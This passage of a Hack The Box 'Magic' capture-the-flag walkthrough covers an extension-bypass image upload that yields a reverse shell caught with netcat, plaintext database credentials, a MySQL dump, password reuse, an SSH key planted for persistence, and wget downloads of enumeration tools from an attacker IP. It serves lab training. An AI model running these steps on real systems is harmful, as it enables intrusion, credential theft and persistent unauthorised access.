# :game_die: Hack The Box Walkthrough Magic D633Fb94Bca4

> **Original Source:** [Hack The Box Walkthrough Magic D633Fb94Bca4](https://infosecwriteups.com/hack-the-box-walkthrough-magic-d633fb94bca4)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

We then rename it as follows:


```
$ mv test69.jpg test6969.php.jpg
```


This will then be interpreted as a php file when we call it through the web server.


At this point, we have already weaponized a legitimate jpg file that is capable of bypassing the file extension check as well as the magic check. The only thing left to do is to check if it works.


On a separate terminal, setup the listener.


```
$ nc -nvlp 6969
```


Make sure that the port you use is the port you entered in the reverse shell script you uploaded.


Once we access the path where our weaponized jpg file is saved upon upload, it will look like this.


While our listener will look like this.


*We got shell!*

### Initial Shell and User Theseus


```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```


I usually start with this command, or a variation of it to improve the shell that I have.


Whenever I get a shell as `www-data`, I always check the `/var/www` directory for artifacts that can give me clues on how I can move forward to the next user. Upon enumeration of the said directory, I saw a lot of files under `/var/www/Magic` , the most notable of which has a filename `db.php5` .


## Get Mok’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


From this file, we were able to retrieve a set of credentials which is listed below:


- username: theseus

- password: iamkingtheseus


Upon getting the credentials of theseus, I immediately tried logging in via ssh.


```
$ ssh theseus@magic.htb
```


*Denied*


Going back to db.php5 file, I noticed that it’s a mysql db file. Upon checking if the service is running, I saw the following:


```
$ systemctl status mysql
```


*Yup, it’s running*


I then proceeded to dump the database using the credentials that we’ve collected earlier.


```
$ mysqldump --opt --user=theseus --password Magic > Magic.sql
```


For further reading about this, you can refer to the link attached below.


Checking the readable strings in the file.


```
$ strings Magic.sql
```


We found another set of credentials, however, at this point I was already confused as to where I’m going to use them, though instinctively, I tried the following command:


```
$ su theseus
Password: Th3s3usW4sK1ng
```


*We got user theseus!*


It seems then that the user theseus created a database user named `admin` for database administration purposes, however even though he created a different user, he still reused his server password³. A summary of the credentials that we retrieved is listed below.


- Database username: admin

- Database password: Th3s3usW4sK1ng

- Server username: theseus

- Server password: Th3s3usW4sK1ng


I also tried logging into the web server using the new creds that we found, however, it redirects to the same upload page that we discovered via SQLI earlier so I guess we can close the possibility of having any leads there now.

### Passwordless SSH and Tool-based Privilege Escalation Enumeration


Upon manual enumeration, I realized that it was quite hassling for me to always re-login via the image upload foothold that we have established, so I made a file in /home/theseus/.ssh/authorized_keys and did the following:


```
$ cat ~/.ssh/id_rsa.pub | xclip -se c
```


In my attacking machine, I printed my public key and piped it into xclip to copy it in my clipboard.


```
$ echo “<public key>” >> ~/.ssh/authorized_keys
```


Then, in the remote machine, I appended my public key into the authorized_keys file. Replacing the file is actually frowned upon as other pentesters may be inconvenienced by this so I appended mine. (Though after this, I experienced inconsiderate skiddies rewriting the whole file. Grrrrrr. HTB VIP is worth the $$$ guys.)


*Passwordless SSH Works!*


So essentially that’s how you setup passwordless ssh.


To aid in our enumeration, I decided to use `linpeas`. You may get it in the link below.


To transfer files from our host to the machine, I decided to setup a SimpleHTTPServer on our host, and then wget the file remotely from the victim machine


```
$ python -m SimpleHTTPServer 6969
```


- Attacking machine where the file is located


```
$ wget 10.10.14.25:6969/linpeas.sh
```


Upon running linpeas, I saw a lot of interesting findings, some of which are dumped below.


However, of everything that linpeas gave me, there’s nothing that stood out at first glance. Upon sampling some of the findings, I decided to use another tool named `pspy64` .


Pspy ‘spies’ over the system to track the commands done by the users on the system, cron jobs, etc as they execute, and see consequently the reaction of the system. We may use it particularly to find the services / commands that run with root privileges.


You may get it in the link below.


```
$ python -m SimpleHTTPServer 6970
```


```
$ wget 10.10.14.25:6970/pspy64
```


```
$ chmod +x pspy64$ ./pspy64
```


Upon spying over the machine for quite a while, very few triggered the reaction from root. Two of them are as follows:

---

*Originally published on [Medium](https://infosecwriteups.com/hack-the-box-walkthrough-magic-d633fb94bca4). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
